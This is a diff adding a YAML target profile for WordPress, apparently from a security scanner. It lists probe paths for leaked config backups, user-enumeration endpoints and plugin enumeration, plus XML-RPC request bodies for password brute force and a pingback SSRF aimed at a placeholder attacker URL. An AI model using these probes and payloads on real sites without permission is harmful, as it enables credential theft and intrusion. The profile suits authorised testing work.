@@ -1,0 +1,58 @@
+id: wordpress
+name: WordPress
+
+detection:
+  paths:
+    - "/wp-login.php"
+    - "/wp-admin/"
+    - "/wp-content/"
+
+sensitive_paths:
+  - "/wp-content/debug.log"
+  - "/.wp-config.php.swp"
+  - "/wp-config.inc"
+  - "/wp-config.php.bak"
+  - "/wp-config.php.old"
+  - "/wp-config.php.txt"
+  - "/wp-config.php~"
+
+user_enumeration:
+  - "/?author=1"
+  - "/wp-json/wp/v2/users"
+  - "/?rest_route=/wp/v2/users"
+
+version_paths:
+  - "/feed"
+  - "/?feed=rss2"
+
+plugin_enum: "/wp-content/plugins/{PLUGIN}/readme.txt"
+theme_enum: "/wp-content/themes/{THEME}/style.css"
+
+xmlrpc_attacks:
+  brute_force:
+    method: POST
+    path: "/xmlrpc.php"
+    body: |
+      <?xml version="1.0"?>
+      <methodCall>
+        <methodName>wp.getUsersBlogs</methodName>
+        <params>
+          <param><value>{USERNAME}</value></param>
+          <param><value>{PASSWORD}</value></param>
+        </params>
+      </methodCall>
+  pingback_ssrf:
+    method: POST
+    path: "/xmlrpc.php"
+    body: |
+      <?xml version="1.0"?>
+      <methodCall>
+        <methodName>pingback.ping</methodName>
+        <params>
+          <param><value>http://ATTACKER_URL</value></param>
+          <param><value>http://TARGET_URL</value></param>
+        </params>
+      </methodCall>
+
+registration: "/wp-login.php?action=register"
+default_credentials: []
